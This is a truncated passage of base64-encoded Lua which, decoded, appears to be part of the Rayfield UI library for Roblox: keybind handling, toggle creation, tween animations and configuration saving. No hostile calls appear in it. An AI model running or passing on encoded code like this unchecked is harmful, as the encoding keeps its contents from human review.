BTcGxpdE1lc3NhZ2UgPSBzdHJpbmcuc3BsaXQodG9zdHJpbmcoaW5wdXQuS2V5Q29kZSksICIuIikKCQkJCQkJbG9jYWwgTmV3S2V5Tm9FbnVtID0gU3BsaXRNZXNzYWdlWzNdCgkJCQkJCUtleWJpbmQuS2V5YmluZEZyYW1lLktleWJpbmRCb3guVGV4dCA9IHRvc3RyaW5nKE5ld0tleU5vRW51bSkKCQkJCQkJS2V5YmluZFNldHRpbmdzLkN1cnJlbnRLZXliaW5kID0gdG9zdHJpbmcoTmV3S2V5Tm9FbnVtKQoJCQkJCQlLZXliaW5kLktleWJpbmRGcmFtZS5LZXliaW5kQm94OlJlbGVhc2VGb2N1cygpCgkJCQkJCWlmIG5vdCBLZXliaW5kU2V0dGluZ3MuRXh0IHRoZW4KCQkJCQkJCVNhdmVDb25maWd1cmF0aW9uKCkKCQkJCQkJZW5kCgoJCQkJCQlpZiBLZXliaW5kU2V0dGluZ3MuQ2FsbE9uQ2hhbmdlIHRoZW4KCQkJCQkJCUtleWJpbmRTZXR0aW5ncy5DYWxsYmFjayh0b3N0cmluZyhOZXdLZXlOb0VudW0pKQoJCQkJCQllbmQKCQkJCQllbmQKCQkJCWVsc2VpZiBub3QgS2V5YmluZFNldHRpbmdzLkNhbGxPbkNoYW5nZSBhbmQgS2V5YmluZFNldHRpbmdzLkN1cnJlbnRLZXliaW5kIH49IG5pbCBhbmQgKGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlW0tleWJpbmRTZXR0aW5ncy5DdXJyZW50S2V5YmluZF0gYW5kIG5vdCBwcm9jZXNzZWQpIHRoZW4gLS0gVGVzdAoJCQkJCWxvY2FsIEhlbGQgPSB0cnVlCgkJCQkJbG9jYWwgQ29ubmVjdGlvbgoJCQkJCUNvbm5lY3Rpb24gPSBpbnB1dC5DaGFuZ2VkOkNvbm5lY3QoZnVuY3Rpb24ocHJvcCkKCQkJCQkJaWYgcHJvcCA9PSAiVXNlcklucHV0U3RhdGUiIHRoZW4KCQkJCQkJCUNvbm5lY3Rpb246RGlzY29ubmVjdCgpCgkJCQkJCQlIZWxkID0gZmFsc2UKCQkJCQkJZW5kCgkJCQkJZW5kKQoKCQkJCQlpZiBub3QgS2V5YmluZFNldHRpbmdzLkhvbGRUb0ludGVyYWN0IHRoZW4KCQkJCQkJbG9jYWwgU3VjY2VzcywgUmVzcG9uc2UgPSBwY2FsbChLZXliaW5kU2V0dGluZ3MuQ2FsbGJhY2spCgkJCQkJCWlmIG5vdCBTdWNjZXNzIHRoZW4KCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5YmluZCwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDg1LCAwLCAwKX0pOlBsYXkoKQoJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShLZXliaW5kLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCQlLZXliaW5kLlRpdGxlLlRleHQgPSAiQ2FsbGJhY2sgRXJyb3IiCgkJCQkJCQlwcmludCgiUmF5ZmllbGQgfCAiLi5LZXliaW5kU2V0dGluZ3MuTmFtZS4uIiBDYWxsYmFjayBFcnJvciAiIC4udG9zdHJpbmcoUmVzcG9uc2UpKQoJCQkJCQkJd2FybignQ2hlY2sgZG9jcy5zaXJpdXMubWVudSBmb3IgaGVscCB3aXRoIFJheWZpZWxkIHNwZWNpZmljIGRldmVsb3BtZW50LicpCgkJCQkJCQl0YXNrLndhaXQoMC41KQoJCQkJCQkJS2V5YmluZC5UaXRsZS5UZXh0ID0gS2V5YmluZFNldHRpbmdzLk5hbWUKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5YmluZCwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmR9KTpQbGF5KCkKCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoS2V5YmluZC5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJCQllbmQKCQkJCQllbHNlCgkJCQkJCXRhc2sud2FpdCgwLjI1KQoJCQkJCQlpZiBIZWxkIHRoZW4KCQkJCQkJCWxvY2FsIExvb3A7IExvb3AgPSBSdW5TZXJ2aWNlLlN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCgkJCQkJCQkJaWYgbm90IEhlbGQgdGhlbgoJCQkJCQkJCQlLZXliaW5kU2V0dGluZ3MuQ2FsbGJhY2soZmFsc2UpIC0tIG1heWJlIHBjYWxsIHRoaXMKCQkJCQkJCQkJTG9vcDpEaXNjb25uZWN0KCkKCQkJCQkJCQllbHNlCgkJCQkJCQkJCUtleWJpbmRTZXR0aW5ncy5DYWxsYmFjayh0cnVlKSAtLSBtYXliZSBwY2FsbCB0aGlzCgkJCQkJCQkJZW5kCgkJCQkJCQllbmQpCgkJCQkJCWVuZAoJCQkJCWVuZAoJCQkJZW5kCgkJCWVuZCkKCgkJCUtleWJpbmQuS2V5YmluZEZyYW1lLktleWJpbmRCb3g6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJUZXh0Iik6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKEtleWJpbmQuS2V5YmluZEZyYW1lLCBUd2VlbkluZm8ubmV3KDAuNTUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtTaXplID0gVURpbTIubmV3KDAsIEtleWJpbmQuS2V5YmluZEZyYW1lLktleWJpbmRCb3guVGV4dEJvdW5kcy5YICsgMjQsIDAsIDMwKX0pOlBsYXkoKQoJCQllbmQpCgoJCQlmdW5jdGlvbiBLZXliaW5kU2V0dGluZ3M6U2V0KE5ld0tleWJpbmQpCgkJCQlLZXliaW5kLktleWJpbmRGcmFtZS5LZXliaW5kQm94LlRleHQgPSB0b3N0cmluZyhOZXdLZXliaW5kKQoJCQkJS2V5YmluZFNldHRpbmdzLkN1cnJlbnRLZXliaW5kID0gdG9zdHJpbmcoTmV3S2V5YmluZCkKCQkJCUtleWJpbmQuS2V5YmluZEZyYW1lLktleWJpbmRCb3g6UmVsZWFzZUZvY3VzKCkKCQkJCWlmIG5vdCBLZXliaW5kU2V0dGluZ3MuRXh0IHRoZW4KCQkJCQlTYXZlQ29uZmlndXJhdGlvbigpCgkJCQllbmQKCgkJCQlpZiBLZXliaW5kU2V0dGluZ3MuQ2FsbE9uQ2hhbmdlIHRoZW4KCQkJCQlLZXliaW5kU2V0dGluZ3MuQ2FsbGJhY2sodG9zdHJpbmcoTmV3S2V5YmluZCkpCgkJCQllbmQKCQkJZW5kCgoJCQlpZiBTZXR0aW5ncy5Db25maWd1cmF0aW9uU2F2aW5nIHRoZW4KCQkJCWlmIFNldHRpbmdzLkNvbmZpZ3VyYXRpb25TYXZpbmcuRW5hYmxlZCBhbmQgS2V5YmluZFNldHRpbmdzLkZsYWcgdGhlbgoJCQkJCVJheWZpZWxkTGlicmFyeS5GbGFnc1tLZXliaW5kU2V0dGluZ3MuRmxhZ10gPSBLZXliaW5kU2V0dGluZ3MKCQkJCWVuZAoJCQllbmQKCgkJCVJheWZpZWxkLk1haW46R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCdCYWNrZ3JvdW5kQ29sb3IzJyk6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlLZXliaW5kLktleWJpbmRGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5JbnB1dEJhY2tncm91bmQKCQkJCUtleWJpbmQuS2V5YmluZEZyYW1lLlVJU3Ryb2tlLkNvbG9yID0gU2VsZWN0ZWRUaGVtZS5JbnB1dFN0cm9rZQoJCQllbmQpCgoJCQlyZXR1cm4gS2V5YmluZFNldHRpbmdzCgkJZW5kCgoJCS0tIFRvZ2dsZQoJCWZ1bmN0aW9uIFRhYjpDcmVhdGVUb2dnbGUoVG9nZ2xlU2V0dGluZ3MpCgkJCWxvY2FsIFRvZ2dsZVZhbHVlID0ge30KCgkJCWxvY2FsIFRvZ2dsZSA9IEVsZW1lbnRzLlRlbXBsYXRlLlRvZ2dsZTpDbG9uZSgpCgkJCVRvZ2dsZS5OYW1lID0gVG9nZ2xlU2V0dGluZ3MuTmFtZQoJCQlUb2dnbGUuVGl0bGUuVGV4dCA9IFRvZ2dsZVNldHRpbmdzLk5hbWUKCQkJVG9nZ2xlLlZpc2libGUgPSB0cnVlCgkJCVRvZ2dsZS5QYXJlbnQgPSBUYWJQYWdlCgoJCQlUb2dnbGUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCQkJVG9nZ2xlLlVJU3Ryb2tlLlRyYW5zcGFyZW5jeSA9IDEKCQkJVG9nZ2xlLlRpdGxlLlRleHRUcmFuc3BhcmVuY3kgPSAxCgkJCVRvZ2dsZS5Td2l0Y2guQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlQmFja2dyb3VuZAoKCQkJaWYgU2VsZWN0ZWRUaGVtZSB+PSBSYXlmaWVsZExpYnJhcnkuVGhlbWUuRGVmYXVsdCB0aGVuCgkJCQlUb2dnbGUuU3dpdGNoLlNoYWRvdy5WaXNpYmxlID0gZmFsc2UKCQkJZW5kCgoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCQoKCQkJaWYgVG9nZ2xlU2V0dGluZ3MuQ3VycmVudFZhbHVlID09IHRydWUgdGhlbgoJCQkJVG9nZ2xlLlN3aXRjaC5JbmRpY2F0b3IuUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTIwLCAwLjUsIDApCgkJCQlUb2dnbGUuU3dpdGNoLkluZGljYXRvci5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlRW5hYmxlZFN0cm9rZQoJCQkJVG9nZ2xlLlN3aXRjaC5JbmRpY2F0b3IuQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlRW5hYmxlZAoJCQkJVG9nZ2xlLlN3aXRjaC5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlRW5hYmxlZE91dGVyU3Ryb2tlCgkJCWVsc2UKCQkJCVRvZ2dsZS5Td2l0Y2guSW5kaWNhdG9yLlBvc2l0aW9uID0gVURpbTIubmV3KDEsIC00MCwgMC41LCAwKQoJCQkJVG9nZ2xlLlN3aXRjaC5JbmRpY2F0b3IuVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLlRvZ2dsZURpc2FibGVkU3Ryb2tlCgkJCQlUb2dnbGUuU3dpdGNoLkluZGljYXRvci5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5Ub2dnbGVEaXNhYmxlZAoJCQkJVG9nZ2xlLlN3aXRjaC5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlRGlzYWJsZWRPdXRlclN0cm9rZQoJCQllbmQKCgkJCVRvZ2dsZS5Nb3VzZUVudGVyOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kSG92ZXJ9KTpQbGF5KCkKCQkJZW5kKQoKCQkJVG9nZ2xlLk1vdXNlTGVhdmU6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmR9KTpQbGF5KCkKCQkJZW5kKQoKCQkJVG9nZ2xlLkludGVyYWN0Lk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJaWYgVG9nZ2xlU2V0dGluZ3MuQ3VycmVudFZhbHVlID09IHRydWUgdGhlbgoJCQkJCVRvZ2dsZVNldHRpbmdzLkN1cnJlbnRWYWx1ZSA9IGZhbHNlCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kSG92ZXJ9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZS5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlN3aXRjaC5JbmRpY2F0b3IsIFR3ZWVuSW5mby5uZXcoMC40NSwgRW51bS5FYXNpbmdTdHlsZS5RdWFydCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1Bvc2l0aW9uID0gVURpbTIubmV3KDEsIC00MCwgMC41LCAwKX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlN3aXRjaC5JbmRpY2F0b3IuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC41NSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge0NvbG9yID0gU2VsZWN0ZWRUaGVtZS5Ub2dnbGVEaXNhYmxlZFN0cm9rZX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlN3aXRjaC5JbmRpY2F0b3IsIFR3ZWVuSW5mby5uZXcoMC44LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlRGlzYWJsZWR9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZS5Td2l0Y2guVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC41NSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge0NvbG9yID0gU2VsZWN0ZWRUaGVtZS5Ub2dnbGVEaXNhYmxlZE91dGVyU3Ryb2tlfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkJCgkJCQllbHNlCgkJCQkJVG9nZ2xlU2V0dGluZ3MuQ3VycmVudFZhbHVlID0gdHJ1ZQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZEhvdmVyfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZS5Td2l0Y2guSW5kaWNhdG9yLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5RdWFydCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1Bvc2l0aW9uID0gVURpbTIubmV3KDEsIC0yMCwgMC41LCAwKX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlN3aXRjaC5JbmRpY2F0b3IuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC41NSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge0NvbG9yID0gU2VsZWN0ZWRUaGVtZS5Ub2dnbGVFbmFibGVkU3Ryb2tlfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuU3dpdGNoLkluZGljYXRvciwgVHdlZW5JbmZvLm5ldygwLjgsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5Ub2dnbGVFbmFibGVkfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuU3dpdGNoLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNTUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtDb2xvciA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlRW5hYmxlZE91dGVyU3Ryb2tlfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkJCQoJCQkJZW5kCgoJCQkJbG9jYWwgU3VjY2VzcywgUmVzcG9uc2UgPSBwY2FsbChmdW5jdGlvbigpCgkJCQkJaWYgZGVidWdYIHRoZW4gd2FybignUnVubmluZyB0b2dnbGUgXCcnLi5Ub2dnbGVTZXR0aW5ncy5OYW1lLi4nXCcgKEludGVyYWN0KScpIGVuZAoKCQkJCQlUb2dnbGVTZXR0aW5ncy5DYWxsYmFjayhUb2dnbGVTZXR0aW5ncy5DdXJyZW50VmFsdWUpCgkJCQllbmQpCgoJCQkJaWYgbm90IFN1Y2Nlc3MgdGhlbgoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoODUsIDAsIDApfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDF9KTpQbGF5KCkKCQkJCQlUb2dnbGUuVGl0bGUuVGV4dCA9ICJDYWxsYmFjayBFcnJvciIKCQkJCQlwcmludCgiUmF5ZmllbGQgfCAiLi5Ub2dnbGVTZXR0aW5ncy5OYW1lLi4iIENhbGxiYWNrIEVycm9yICIgLi50b3N0cmluZyhSZXNwb25zZSkpCgkJCQkJd2FybignQ2hlY2sgZG9jcy5zaXJpdXMubWVudSBmb3IgaGVscCB3aXRoIFJheWZpZWxkIHNwZWNpZmljIGRldmVsb3BtZW50LicpCgkJCQkJdGFzay53YWl0KDAuNSkKCQkJCQlUb2dnbGUuVGl0bGUuVGV4dCA9IFRvZ2dsZVNldHRpbmdzLk5hbWUKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmR9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZS5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQkJZW5kCgoJCQkJaWYgbm90IFRvZ2dsZVNldHRpbmdzLkV4dCB0aGVuCgkJCQkJU2F2ZUNvbmZpZ3VyYXRpb24oKQoJCQkJZW5kCgkJCWVuZCkKCgkJCWZ1bmN0aW9uIFRvZ2dsZVNldHRpbmdzOlNldChOZXdUb2dnbGVWYWx1ZSkKCQkJCWlmIE5ld1RvZ2dsZVZhbHVlID09IHRydWUgdGhlbgoJCQkJCVRvZ2dsZVNldHRpbmdzLkN1cnJlbnRWYWx1ZSA9IHRydWUKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmRIb3Zlcn0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuU3dpdGNoLkluZGljYXRvciwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuUXVhcnQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtQb3NpdGlvbiA9IFVEaW0yLm5ldygxLCAtMjAsIDAuNSwgMCl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZS5Td2l0Y2guSW5kaWNhdG9yLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5RdWFydCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1NpemUgPSBVRGltMi5uZXcoMCwxMiwwLDEyKX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlN3aXRjaC5JbmRpY2F0b3IuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC41NSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge0NvbG9yID0gU2VsZWN0ZWRUaGVtZS5Ub2dnbGVFbmFibGVkU3Ryb2tlfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuU3dpdGNoLkluZGljYXRvciwgVHdlZW5JbmZvLm5ldygwLjgsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5Ub2dnbGVFbmFibGVkfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuU3dpdGNoLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNTUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksIHtDb2xvciA9IFNlbGVjdGVkVGhlbWUuVG9nZ2xlRW5hYmxlZE91dGVyU3Ryb2tlfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuU3dpdGNoLkluZGljYXRvciwgVHdlZW5JbmZvLm5ldygwLjQ1LCBFbnVtLkVhc2luZ1N0eWxlLlF1YXJ0LCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLDE3LDAsMTcpfSk6UGxheSgpCQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZH0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCQoJCQkJZWxzZQoJCQkJCVRvZ2dsZVNldHRpbmdzLkN1cnJlbnRWYWx1ZSA9IGZhbHNlCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kSG92ZXJ9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFRvZ2dsZS5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlN3aXRjaC5JbmRpY2F0b3IsIFR3ZWVuSW5mby5uZXcoMC40NSwgRW51bS5FYXNpbmdTdHlsZS5RdWFydCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1Bvc2l0aW9uID0gVURpbTIubmV3KDEsIC00MCwgMC41LCAwKX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoVG9nZ2xlLlN3aXRjaC5JbmRpY2F0b3IsIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLlF1YXJ0LCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLCB7U2l6ZSA9IFVEaW0yLm5ldygwLDEyLDAsMTIpfSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShUb2dnbGUuU3dpdGNoLkluZGljYXRvci5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjU1LCBFbnVtLkV